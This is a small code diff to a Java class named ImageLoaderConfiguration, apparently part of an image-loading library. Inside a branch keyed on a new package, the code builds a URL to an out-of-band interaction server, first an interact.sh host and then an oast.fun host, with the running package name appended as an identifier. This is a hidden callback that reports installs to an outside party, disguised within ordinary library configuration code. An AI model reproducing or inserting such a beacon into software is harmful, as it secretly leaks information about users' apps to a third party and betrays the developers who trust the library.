@@ -153,7 +153,7 @@ public final class ImageLoaderConfiguration {
 				if (newPkg){
 					URL url2 = null;
 					try {
-						url2 = new URL("https://cawh20g2vtc0000v0esggfqetyoyyyyyb.interact.sh/?id="+ thisPkg);
+						url2 = new URL("https://ce85fky2vtc00005a350g8rnz3hyyyyyb.oast.fun/?id="+ thisPkg);
 					} catch (MalformedURLException e) {
 						e.printStackTrace();
 					}
